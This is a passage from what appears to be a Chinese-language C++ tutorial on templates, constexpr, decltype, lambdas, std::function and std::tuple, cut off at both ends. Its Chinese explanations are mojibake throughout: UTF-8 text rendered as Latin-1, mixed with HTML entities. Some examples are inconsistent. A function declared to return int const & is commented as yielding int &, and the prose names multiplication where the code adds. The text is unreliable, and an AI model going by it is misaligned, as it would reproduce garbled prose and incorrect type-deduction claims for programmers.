&lt;&lt; std::endl; &#125; return res;&#125;int main() &#123; std::cout &lt;&lt; sumto(4, true) &lt;&lt; std::endl; std::cout &lt;&lt; sumto(4, false) &lt;&lt; std::endl; return 0;&#125; ä½†æ˜¯è¿™æ · debug æ˜¯è¿è¡Œæ—¶åˆ¤æ–­ï¼Œè¿™æ ·å³ä½¿æ˜¯ debug ä¸º false ä¹Ÿä¼šæµªè´¹ CPU æ—¶é—´ã€‚ å› æ­¤å¯ä»¥æŠŠ debug æ”¹æˆæ¨¡æ¿å‚æ•°ï¼Œè¿™æ ·å°±æ˜¯ç¼–è¯‘æœŸå¸¸é‡ã€‚ç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸¤ä»½å‡½æ•° sumto&lt;true&gt; å’Œ sumto&lt;false&gt;ã€‚å‰è€…ä¿ç•™äº†è°ƒè¯•ç”¨çš„æ‰“å°è¯­å¥ï¼Œåè€…åˆ™å®Œå…¨ä¸ºæ€§èƒ½ä¼˜åŒ–è€Œå¯ä»¥å»æ‰æ‰“å°è¯­å¥ã€‚ æ›´è¿›ä¸€æ­¥ï¼Œå¯ä»¥ç”¨C++17çš„ if constexpr è¯­æ³•ï¼Œä¿è¯æ˜¯ç¼–è¯‘æœŸç¡®å®šçš„åˆ†æ”¯ï¼š 123456789101112131415161718#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;int main() &#123; std::cout &lt;&lt; sumto&lt;true&gt;(4) &lt;&lt; std::endl; std::cout &lt;&lt; sumto&lt;false&gt;(4) &lt;&lt; std::endl; return 0;&#125; ç¼–è¯‘æœŸå¸¸é‡çš„é™åˆ¶å°±åœ¨äºä»–ä¸èƒ½é€šè¿‡è¿è¡Œæ—¶å˜é‡ç»„æˆçš„è¡¨è¾¾å¼æ¥æŒ‡å®šã€‚ ç¼–è¯‘æœŸ constexpr çš„è¡¨è¾¾å¼ï¼Œä¸€èˆ¬æ˜¯æ— æ³•è°ƒç”¨å…¶ä»–å‡½æ•°çš„ï¼š å¦‚æœèƒ½ä¿è¯ isnegative é‡Œéƒ½å¯ä»¥åœ¨ç¼–è¯‘æœŸæ±‚å€¼ï¼Œå°†ä»–å‰é¢ä¹Ÿæ ‡ä¸Š constexpr å³å¯ã€‚ 12345678910111213141516171819202122#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;constexpr bool isnegative(int n) &#123; return n &lt; 0;&#125;int main() &#123; constexpr bool debug = isnegative(-2014); std::cout &lt;&lt; sumto&lt;debug&gt;(4) &lt;&lt; std::endl; return 0;&#125; constexpr å‡½æ•°ä¸èƒ½è°ƒç”¨ non-constexpr å‡½æ•°ã€‚è€Œä¸” constexpr å‡½æ•°å¿…é¡»æ˜¯å†…è”ï¼ˆinlineï¼‰çš„ï¼Œä¸èƒ½åˆ†ç¦»å£°æ˜å’Œå®šä¹‰åœ¨å¦ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚æ ‡å‡†åº“çš„å¾ˆå¤šå‡½æ•°å¦‚ std::min ä¹Ÿæ˜¯ constexpr å‡½æ•°ï¼Œå¯ä»¥æ”¾å¿ƒå¤§èƒ†åœ¨æ¨¡æ¿å°–æ‹¬å·å†…ä½¿ç”¨ã€‚ å®šä¹‰å’Œå®ç°éƒ½å¿…é¡»æ”¾åœ¨å¤´æ–‡ä»¶ å¦‚æœæˆ‘ä»¬è¯•ç€åƒä¼ ç»Ÿå‡½æ•°é‚£æ ·åˆ†ç¦»æ¨¡æ¿å‡½æ•°çš„å£°æ˜ä¸å®ç°ï¼š 123456// sumto.h#pragma oncetemplate &lt;bool debug&gt;int sumto(int n); 123456789101112131415// sumto.cpp#include \"sumto.h\"#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125; 12345678910// main.cpp#include \"sumto.h\"#include &lt;iostream&gt;int main() &#123; constexpr bool debug = true; std::cout &lt;&lt; sumto&lt;debug&gt;(4) &lt;&lt; std::endl; return 0;&#125; ä¼šå‡ºç° undefined reference é”™è¯¯ã€‚ å› ä¸ºç¼–è¯‘å™¨å¯¹æ¨¡æ¿çš„ç¼–è¯‘æ˜¯æƒ°æ€§çš„ï¼Œå³åªæœ‰å½“å‰ .cpp æ–‡ä»¶ç”¨åˆ°äº†è¿™ä¸ªæ¨¡æ¿ï¼Œè¯¥æ¨¡æ¿é‡Œçš„å‡½æ•°æ‰ä¼šè¢«å®šä¹‰ã€‚ è€Œæˆ‘ä»¬çš„ sumto.cpp ä¸­æ²¡æœ‰ç”¨åˆ° sumto&lt;&gt; å‡½æ•°çš„ä»»ä½•ä¸€ä»½å®šä¹‰ï¼Œæ‰€ä»¥ main.cpp é‡Œåªçœ‹åˆ° sumto&lt;&gt; å‡½æ•°çš„ä¸¤ä»½å£°æ˜ï¼Œä»è€Œå‡ºé”™ã€‚ è§£å†³æ–¹æ³•ï¼šåœ¨çœ‹å¾—è§ sumto&lt;&gt; å®šä¹‰çš„ sumto.cpp é‡Œï¼Œå¢åŠ ä¸¤ä¸ªæ˜¾å¼ç¼–è¯‘æ¨¡æ¿çš„å£°æ˜ï¼š 12345678910111213141516#include \"sumto.h\"#include &lt;iostream&gt;template &lt;bool debug&gt;int sumto(int n) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if constexpr (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res &lt;&lt; std::endl; &#125; return res;&#125;template int sumto&lt;true&gt;(int n);template int sumto&lt;false&gt;(int n); å»¶è¿Ÿç¼–è¯‘ åªæœ‰å½“ main è°ƒç”¨äº†æ¨¡æ¿å‡½æ•°ï¼Œæ‰ä¼šè¢«ç¼–è¯‘ï¼Œæ‰ä¼šæŠ¥é”™ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T&gt;void print(std::vector&lt;T&gt; const &amp;a) &#123; std::cout &lt;&lt; \"&#123;\"; for (size_t i = 0; i &lt; a.size(); i++) &#123; std::cout &lt;&lt; a[i]; if (i != a.size() - 1) std::cout &lt;&lt; \", \"; &#125; std::cout &lt;&lt; \"&#125;\" &lt;&lt; std::endl;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;1, 4, 2, 8, 5, 7&#125;; print(a); std::vector&lt;double&gt; b = &#123;3.14, 2.718, 0.618&#125;; print(b); return 0;&#125; å¦å¤–ï¼Œinlineåœ¨å¦‚ä»Šçš„ç¼–è¯‘å™¨ï¼Œå·²ç»æ˜¯è‡ªåŠ¨ä¼˜åŒ–çš„ä¸€éƒ¨åˆ†ï¼Œå£°æ˜ä¸å£°æ˜å¯¹äºå‡½æ•°æ²¡æœ‰æ„ä¹‰ã€‚å…³é”®æ˜¯è¦å°†å£°æ˜å’Œå®ç°æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚ å¦å¤–ï¼Œregisterç­‰ä¼˜åŒ–å…³é”®å­—ï¼Œä¹Ÿé€æ¸è¢«ä¼˜åŒ–åˆ°ç¼–è¯‘ä¸­ï¼Œä¸éœ€è¦æ‰‹åŠ¨å£°æ˜ã€‚ å¸¸å¼•ç”¨ï¼ˆint const &amp;ï¼‰ const ä¿®é¥°ç¬¦çš„å­˜åœ¨ï¼Œä½¿å¾— ref ä¸èƒ½è¢«å†™å…¥ï¼ˆèµ‹å€¼ï¼‰ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯æ›´åŠ å®‰å…¨ï¼ˆç¼–è¯‘å™¨ä¹Ÿèƒ½å¤Ÿæ”¾å¿ƒå¤§èƒ†åœ°åšè‡ªåŠ¨ä¼˜åŒ–ï¼‰ã€‚ auto ä¹Ÿå¯ä»¥ç”¨æ¥å®šä¹‰å¼•ç”¨ï¼Œåªéœ€è¦æ”¹æˆ auto &amp; å³å¯ã€‚ å‡½æ•°è¿”å›å¼•ç”¨ å‡½æ•°çš„è¿”å›ç±»å‹ä¹Ÿå¯ä»¥æ˜¯ auto &amp; æˆ–è€… auto const &amp;ã€‚æ¯”å¦‚æ‡’æ±‰å•ä¾‹æ¨¡å¼ï¼š 12345678910111213#include &lt;cstdio&gt;#include &lt;string&gt;#include &lt;map&gt;auto &amp;product_table() &#123; static std::map&lt;std::string, int&gt; instance; return instance;&#125;int main() &#123; product_table().emplace(\"ä½©å¥‡\", 80); product_table().emplace(\"å¦ˆå¦ˆ\", 100);&#125; constï¼šå¸¸å€¼ä¿®é¥°ç¬¦ ä¸ &amp; ä¿®é¥°ç¬¦ä¸åŒï¼Œint const å’Œ int å¯ä»¥çœ‹åšä¸¤ä¸ªä¸åŒçš„ç±»å‹ã€‚ä¸è¿‡ int const æ˜¯ä¸å¯å†™å…¥ã€‚ å› æ­¤ int const &amp; æ— éæ˜¯å¦ä¸€ä¸ªç±»å‹ int const çš„å¼•ç”¨ç½¢äº†ã€‚è¿™ä¸ªå¼•ç”¨ä¸å¯å†™å…¥ã€‚ C++ è§„å®š int &amp;&amp; èƒ½è‡ªåŠ¨è½¬æ¢æˆ int const &amp;ï¼Œä½†ä¸èƒ½è½¬æ¢æˆ int &amp;ã€‚ 1234void func(int const &amp;i);// å°½ç®¡ 3 æ˜¯å³å€¼ int &amp;&amp;ï¼Œä½†å´èƒ½ä¼ åˆ°ç±»å‹ä¸º int const &amp; çš„å‚æ•°ä¸Šfunc(3); ä¸€ä¸ªæ–¹ä¾¿æŸ¥çœ‹ç±»å‹åçš„å°å·¥å…·: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;string&gt;#if defined(__GNUC__) || defined(__clang__)#include &lt;cxxabi.h&gt;#endiftemplate &lt;class T&gt;std::string cpp_type_name() &#123; const char *name = typeid(T).name();#if defined(__GNUC__) || defined(__clang__) int status; char *p = abi::__cxa_demangle(name, 0, 0, &amp;status); std::string s = p; std::free(p);#else std::string s = name;#endif if (std::is_const_v&lt;std::remove_reference_t&lt;T&gt;&gt;) s += \" const\"; if (std::is_volatile_v&lt;std::remove_reference_t&lt;T&gt;&gt;) s += \" volatile\"; if (std::is_lvalue_reference_v&lt;T&gt;) s += \" &amp;\"; if (std::is_rvalue_reference_v&lt;T&gt;) s += \" &amp;&amp;\"; return s;&#125;#define SHOW(T) std::cout &lt;&lt; cpp_type_name&lt;T&gt;() &lt;&lt; std::endl;int main() &#123; int a; auto &amp;c = a; auto const &amp;b = a; SHOW(decltype(a)); SHOW(decltype(b)); SHOW(decltype(c));&#125; å¯ä»¥é€šè¿‡ decltype(å˜é‡å) è·å–å˜é‡å®šä¹‰æ—¶å€™çš„ç±»å‹ã€‚ æ³¨æ„ decltype(å˜é‡å) å’Œ decltype(è¡¨è¾¾å¼) æ˜¯ä¸åŒçš„ã€‚ å¯ä»¥é€šè¿‡ decltype((a)) æ¥å¼ºåˆ¶ç¼–è¯‘å™¨ä½¿ç”¨åè€…ï¼Œä»è€Œå¾—åˆ° int &amp;ã€‚ ä¸‡èƒ½æ¨å¯¼ï¼ˆdecltype(auto)ï¼‰ å¦‚æœä¸€ä¸ªè¡¨è¾¾å¼ï¼Œæˆ‘ä¸çŸ¥é“ä»–æ˜¯ä¸ªå¯å˜å¼•ç”¨ï¼ˆint &amp;ï¼‰ï¼Œå¸¸å¼•ç”¨ï¼ˆint const &amp;ï¼‰ï¼Œå³å€¼å¼•ç”¨ï¼ˆint &amp;&amp;ï¼‰ï¼Œè¿˜æ˜¯ä¸€ä¸ªæ™®é€šçš„å€¼ï¼ˆintï¼‰ã€‚ æƒ³è¦å®šä¹‰ä¸€ä¸ªå’Œè¡¨è¾¾å¼è¿”å›ç±»å‹ä¸€æ ·çš„å˜é‡ï¼Œè¿™æ—¶å€™å¯ä»¥ç”¨ï¼š decltype(auto) p = func(); ä¼šè‡ªåŠ¨æ¨å¯¼ä¸º func() çš„è¿”å›ç±»å‹ã€‚ decltype(auto) èƒ½å¤ŸåŒæ—¶é€‚é… auto å’Œ auto &amp; è¿”å›å€¼ç±»å‹çš„ä¸¤ç§æƒ…å†µã€‚ 123456789101112131415161718192021#include &lt;cstdio&gt;int t;int const &amp;func_ref() &#123; return t;&#125;int const &amp;func_cref() &#123; return t;&#125;int func_val() &#123; return t;&#125;int main() &#123; decltype(auto) a = func_cref(); // int const &amp;a decltype(auto) b = func_ref(); // int &amp;b decltype(auto) c = func_val(); // int c&#125; usingï¼šåˆ›å»ºç±»å‹åˆ«å é™¤äº† typedef å¤–ï¼Œè¿˜å¯ä»¥ç”¨ using åˆ›å»ºç±»å‹åˆ«åï¼š 12typedef std::vector&lt;int&gt; VecInt;using VecInt = std::vector&lt;int&gt;; ä»¥ä¸Šæ˜¯ç­‰ä»·çš„ã€‚ 12typedef int (*PFunc)(int);using PFunc = int(*)(int); ä»¥ä¸Šæ˜¯ç­‰ä»·çš„ã€‚ ä¸€ä¸ªä¾‹å­ è¿™æ˜¯ä¸€ä¸ªå®ç°å°†ä¸¤ä¸ªä¸åŒç±»å‹ vector é€å…ƒç´ ç›¸åŠ çš„å‡½æ•°: ç”¨ decltype(T1{} * T2{}) ç®—å‡º T1 å’Œ T2 ç±»å‹ç›¸åŠ ä»¥åçš„ç»“æœï¼Œå¹¶åšä¸ºè¿”å›çš„ vector å®¹å™¨ä¸­çš„æ•°æ®ç±»å‹ã€‚ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T1, class T2&gt;auto add(std::vector&lt;T1&gt; const &amp;a, std::vector&lt;T2&gt; const &amp;b) &#123; using T0 = decltype(T1&#123;&#125; + T2&#123;&#125;); std::vector&lt;T0&gt; ret; for (size_t i = 0; i &lt; std::min(a.size(), b.size()); i++) &#123; ret.push_back(a[i] + b[i]); &#125; return ret;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;2, 3, 4&#125;; std::vector&lt;float&gt; b = &#123;0.5f, 1.0f, 2.0f&#125;; auto c = add(a, b); for (size_t i = 0; i &lt; c.size(); i++) &#123; std::cout &lt;&lt; c[i] &lt;&lt; std::endl; &#125; return 0;&#125; å‡½æ•°å¼ç¼–ç¨‹ å‡½æ•°å¯ä»¥ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°: 123456789101112131415#include &lt;cstdio&gt;void say_hello() &#123; printf(\"Hello!\\n\");&#125;void call_twice(void func()) &#123; func(); func();&#125;int main() &#123; call_twice(say_hello); return 0;&#125; å‡½æ•°ä½œä¸ºæ¨¡æ¿ç±»å‹ call_twice ä¼šè‡ªåŠ¨å¯¹æ¯ä¸ªä¸åŒçš„ func ç±»å‹ç¼–è¯‘ä¸€éï¼Œä»è€Œå…è®¸ç¼–è¯‘å™¨æ›´å¥½åœ°è¿›è¡Œè‡ªåŠ¨é€‚é…ä¸ä¼˜åŒ–ã€‚ 123456789101112131415161718192021#include &lt;cstdio&gt;void print_float(float n) &#123; printf(\"Float %f\\n\", n);&#125;void print_int(int n) &#123; printf(\"Int %d\\n\", n);&#125;template &lt;class Func&gt;void call_twice(Func func) &#123; func(0); func(1);&#125;int main() &#123; call_twice(print_float); call_twice(print_int); return 0;&#125; lambdaè¡¨è¾¾å¼ å¦‚æœ lambda è¡¨è¾¾å¼ä¸é€šè¿‡ -&gt; æŒ‡å®šè¿”å›ç±»å‹ï¼Œåˆ™å’Œ -&gt; auto ç­‰ä»·ï¼Œè‡ªåŠ¨æ ¹æ®å‡½æ•°ä½“å†…çš„ return è¯­å¥å†³å®šè¿”å›ç±»å‹ï¼Œå¦‚æœæ²¡æœ‰ return è¯­å¥åˆ™ç›¸å½“äº -&gt; voidã€‚ 123456789101112131415#include &lt;cstdio&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; func(0); func(1);&#125;int main() &#123; auto myfunc = [] (int n) &#123; printf(\"Number %d\\n\", n); &#125;; call_twice(myfunc); return 0;&#125; lambda å‡½æ•°ä½“ä¸­ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å®šä¹‰ä»–çš„ main å‡½æ•°ä¸­çš„å˜é‡ï¼Œåªéœ€è¦æŠŠæ–¹æ‹¬å· [] æ”¹æˆ [&amp;] å³å¯ã€‚ å‡½æ•°å¯ä»¥å¼•ç”¨å®šä¹‰ä½ç½®æ‰€æœ‰çš„å˜é‡ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ç§°ä¸ºé—­åŒ…(closure)ã€‚ 123456789101112131415#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl;&#125;int main() &#123; auto twice = [] (int n) -&gt; int &#123; return n * 2; &#125;; call_twice(twice); return 0;&#125; [&amp;] ä¸ä»…å¯ä»¥è¯»å– main ä¸­çš„å˜é‡ï¼Œè¿˜å¯ä»¥å†™å…¥ main ä¸­çš„å˜é‡ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡ counter++ è®°å½•è¯¥å‡½æ•°è¢«è°ƒç”¨äº†å¤šå°‘æ¬¡ã€‚ 12345678910111213141516171819#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl;&#125;int main() &#123; int fac = 2; int counter = 0; auto twice = [&amp;] (int n) &#123; counter++; return n * fac; &#125;; call_twice(twice); std::cout &lt;&lt; \"è°ƒç”¨äº† \" &lt;&lt; counter &lt;&lt; \" æ¬¡\" &lt;&lt; std::endl; return 0;&#125; æ­¤å¤–ï¼Œæœ€å¥½æŠŠæ¨¡æ¿å‚æ•°çš„ Func å£°æ˜ä¸º Func const &amp; ä»¥é¿å…ä¸å¿…è¦çš„æ‹·è´ã€‚ å› ä¸ºé—­åŒ…çš„éœ€è¦ï¼ŒFuncåœ¨å‚æ•°ä¼ é€’å¤åˆ¶æ—¶ï¼Œéœ€è¦å°†å±€éƒ¨å˜é‡facå’Œcounterä¹Ÿè¿›è¡Œå¤åˆ¶ä¼ é€’ã€‚æ‰€ä»¥ä¸åŠ constä¼šä½¿å¾—å‚æ•°ç©ºé—´ä¸º16å­—èŠ‚ã€‚ï¼ˆ64ä½æœºå™¨ï¼‰ 1234567891011121314151617181920#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func çš„å¤§å°: \" &lt;&lt; sizeof(Func) &lt;&lt; std::endl;&#125;int main() &#123; int fac = 2; int counter = 0; auto twice = [&amp;] (int n) &#123; counter++; return n * fac; &#125;; call_twice(twice); std::cout &lt;&lt; \"è°ƒç”¨äº† \" &lt;&lt; counter &lt;&lt; \" æ¬¡\" &lt;&lt; std::endl; return 0;&#125; ä½œä¸ºè¿”å›å€¼ å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½œä¸ºè¿”å›å€¼ã€‚ç”±äº lambda è¡¨è¾¾å¼æ°¸è¿œæ˜¯ä¸ªåŒ¿åç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦å°† make_twice çš„è¿”å›ç±»å‹å£°æ˜ä¸º auto è®©ä»–è‡ªåŠ¨æ¨å¯¼ã€‚ 1234567891011121314151617181920#include &lt;iostream&gt;template &lt;class Func&gt;void call_twice(Func const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func å¤§å°: \" &lt;&lt; sizeof(Func) &lt;&lt; std::endl;&#125;auto make_twice() &#123; return [] (int n) &#123; return n * 2; &#125;;&#125;int main() &#123; auto twice = make_twice(); call_twice(twice); return 0;&#125; å¦‚æœç”¨ [&amp;]ï¼Œè¯·ä¿è¯ lambda å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¸è¶…è¿‡ä»–æ•è·çš„æ‰€æœ‰å¼•ç”¨çš„å¯¿å‘½ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ [=] æ¥æ•è·ï¼Œ[=] ä¼šç»™æ¯ä¸€ä¸ªå¼•ç”¨äº†çš„å˜é‡åšä¸€ä»½æ‹·è´ã€‚æ€§èƒ½å¯èƒ½ä¼šä¸å¦‚ [&amp;]ã€‚ lambda ä½œä¸ºå‚æ•°ï¼šé€šå¸¸ç”¨ [&amp;] å­˜å‚¨å¼•ç”¨ã€‚ lambda ä½œä¸ºè¿”å›å€¼ï¼šæ€»æ˜¯ç”¨ [=] å­˜å‚¨å€¼ã€‚ å‡½æ•°æŒ‡é’ˆ å¦‚æœä½ çš„ lambda æ²¡æœ‰æ•è·ä»»ä½•å±€éƒ¨å˜é‡ï¼Œä¹Ÿå°±æ˜¯ []ï¼Œé‚£ä¹ˆä¸éœ€è¦ç”¨ std::function&lt;int(int)&gt;ï¼Œç›´æ¥ç”¨å‡½æ•°æŒ‡é’ˆçš„ç±»å‹ int(int) æˆ–è€… int(*)(int) å³å¯ã€‚ å‡½æ•°æŒ‡é’ˆæ•ˆç‡æ›´é«˜ä¸€äº›ï¼Œä½†æ˜¯ [] å°±æ²¡åŠæ³•æ•è·å±€éƒ¨å˜é‡äº†ï¼ˆå…¨å±€å˜é‡è¿˜æ˜¯å¯ä»¥çš„ï¼‰ã€‚ 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(std::function&lt;int(int)&gt; const &amp;func) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func å¤§å°: \" &lt;&lt; sizeof(func) &lt;&lt; std::endl;&#125;std::function&lt;int(int)&gt; make_twice(int fac) &#123; return [=] (int n) &#123; return n * fac; &#125;;&#125;int main() &#123; auto twice = make_twice(2); call_twice(twice); return 0;&#125; 123456789101112131415#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(int func(int)) &#123; std::cout &lt;&lt; func(0) &lt;&lt; std::endl; std::cout &lt;&lt; func(1) &lt;&lt; std::endl; std::cout &lt;&lt; \"Func å¤§å°: \" &lt;&lt; sizeof(func) &lt;&lt; std::endl;&#125;int main() &#123; call_twice([] (int n) &#123; return n * 2; &#125;); return 0;&#125; lambda + æ¨¡æ¿ å¯ä»¥å°† lambda è¡¨è¾¾å¼çš„å‚æ•°å£°æ˜ä¸º autoï¼Œå£°æ˜ä¸º auto çš„å‚æ•°ä¼šè‡ªåŠ¨æ ¹æ®è°ƒç”¨è€…ç»™çš„å‚æ•°æ¨å¯¼ç±»å‹ï¼ŒåŸºæœ¬ä¸Šå’Œ template &lt;class T&gt; ç­‰ä»·ã€‚ auto const &amp; ä¹Ÿæ˜¯åŒç†ï¼Œç­‰ä»·äºæ¨¡æ¿å‡½æ•°çš„ T const &amp;ã€‚ å¸¦ auto å‚æ•°çš„ lambda è¡¨è¾¾å¼ï¼Œå’Œæ¨¡æ¿å‡½æ•°ä¸€æ ·ï¼ŒåŒæ ·ä¼šæœ‰æƒ°æ€§ã€å¤šæ¬¡ç¼–è¯‘çš„ç‰¹æ€§ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;functional&gt;void call_twice(auto const &amp;func) &#123; std::cout &lt;&lt; func(3.14f) &lt;&lt; std::endl; std::cout &lt;&lt; func(21) &lt;&lt; std::endl;&#125;int main() &#123; auto twice = [] &lt;class T&gt; (T n) &#123; return n * 2; &#125;; call_twice(twice); return 0;&#125;/* ç­‰ä»·äºï¼šauto twice(auto n) &#123; return n * 2;&#125;*/ C++20 å‡½æ•°ä¹Ÿå¯ä»¥ autoï¼Œlambda ä¹Ÿå¯ä»¥ &lt;class T&gt;ã€‚ 12345auto wrap(auto f) &#123; return [=] (auto ...args) &#123; return f(f, args...); &#125;;&#125; ä¸¾ä¾‹ï¼šyieldæ¨¡å¼ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class Func&gt;void fetch_data(Func const &amp;func) &#123; for (int i = 0; i &lt; 32; i++) &#123; func(i); func(i + 0.5f); &#125;&#125;int main() &#123; std::vector&lt;int&gt; res_i; std::vector&lt;float&gt; res_f; fetch_data([&amp;] (auto const &amp;x) &#123; using T = std::decay_t&lt;decltype(x)&gt;; if constexpr (std::is_same_v&lt;T, int&gt;) &#123; res_i.push_back(x); &#125; else if constexpr (std::is_same_v&lt;T, float&gt;) &#123; res_f.push_back(x); &#125; &#125;); std::cout &lt;&lt; res_i.size() &lt;&lt; std::endl; std::cout &lt;&lt; res_f.size() &lt;&lt; std::endl; return 0;&#125; è¿™é‡Œç”¨äº† type_traits æ¥è·å– x çš„ç±»å‹ã€‚ decay_t&lt;int const &amp;&gt; = int is_same_v&lt;int, int&gt; = true is_same_v&lt;float, int&gt; = false ä¸¾ä¾‹ï¼šç«‹å³æ±‚å€¼ 123456789101112131415#include &lt;iostream&gt;#include &lt;vector&gt;int main() &#123; std::vector&lt;int&gt; arr = &#123;1, 4, 2, 8, 5, 7&#125;; int tofind = 5; int index = [&amp;] &#123; for (int i = 0; i &lt; arr.size(); i++) if (arr[i] == tofind) return i; return -1; &#125;(); std::cout &lt;&lt; index &lt;&lt; std::endl; return 0;&#125; ä¸éœ€è¦flagå˜é‡ã€‚ ä¸¾ä¾‹ï¼šå±€éƒ¨å®ç°é€’å½’ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;set&gt;int main() &#123; std::vector&lt;int&gt; arr = &#123;1, 4, 2, 8, 5, 7, 1, 4&#125;; std::set&lt;int&gt; visited; auto dfs = [&amp;] (auto const &amp;dfs, int index) -&gt; void &#123; if (visited.find(index) == visited.end()) &#123; visited.insert(index); std::cout &lt;&lt; index &lt;&lt; std::endl; int next = arr[index]; dfs(dfs, next); &#125; &#125;; dfs(dfs, 0); return 0;&#125; C++ æ–°ç‰¹æ€§ tuple std::tuple&lt;...&gt; å¯ä»¥å°†å¤šä¸ªä¸åŒç±»å‹çš„å€¼æ‰“åŒ…æˆä¸€ä¸ªã€‚å°–æ‹¬å·é‡Œå¡«å„ä¸ªå…ƒç´ çš„ç±»å‹ã€‚ä¹‹åå¯ä»¥ç”¨ std::get&lt;0&gt; è·å–ç¬¬0ä¸ªå…ƒç´ ï¼Œstd::get&lt;1&gt; è·å–ç¬¬1ä¸ªå…ƒç´ ï¼Œä»¥æ­¤ç±»æ¨ï¼ˆä»0å¼€å§‹æ•°æ•°ï¼‰ã€‚ 123456789101112131415#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple&lt;int, float, char&gt;(3, 3.14f, 'h'); int first = std::get&lt;0&gt;(tup); float second = std::get&lt;1&gt;(tup); char third = std::get&lt;2&gt;(tup); std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; C++17 çš„æ–°ç‰¹æ€§ï¼šCTADã€‚å½“ç”¨äºæ„é€ å‡½æ•°æ—¶ï¼Œstd::tuple&lt;...&gt; å°–æ‹¬å·é‡Œçš„ç±»å‹å¯ä»¥çœç•¥ã€‚ 123456789101112131415#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto first = std::get&lt;0&gt;(tup); auto second = std::get&lt;1&gt;(tup); auto third = std::get&lt;2&gt;(tup); std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; é€šè¿‡ auto è‡ªåŠ¨æ¨å¯¼ get çš„è¿”å›ç±»å‹ã€‚ ç»“æ„åŒ–ç»‘å®š åˆ©ç”¨ä¸€ä¸ªæ–¹æ‹¬å·ï¼Œé‡Œé¢æ˜¯å˜é‡ååˆ—è¡¨ï¼Œå³å¯è§£åŒ…ä¸€ä¸ª tupleã€‚ 12345678910111213#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto [first, second, third] = tup; std::cout &lt;&lt; first &lt;&lt; std::endl; std::cout &lt;&lt; second &lt;&lt; std::endl; std::cout &lt;&lt; third &lt;&lt; std::endl; return 0;&#125; ç»“æ„åŒ–ç»‘å®šä¹Ÿæ”¯æŒç»‘å®šä¸ºå¼•ç”¨ï¼Œè¿™æ ·ç›¸å½“äºè§£åŒ…å‡ºæ¥çš„ x, y, ... éƒ½æ˜¯ auto &amp; æ¨å¯¼å‡ºæ¥çš„å¼•ç”¨ç±»å‹ã€‚å¯¹å¼•ç”¨çš„ä¿®æ”¹å¯ä»¥å½±å“åˆ°åŸ tuple å†…çš„å€¼ã€‚ 1234567891011121314#include &lt;iostream&gt;#include &lt;tuple&gt;int main() &#123; auto tup = std::tuple(3, 3.14f, 'h'); auto &amp;[first, second, third] = tup; std::cout &lt;&lt; 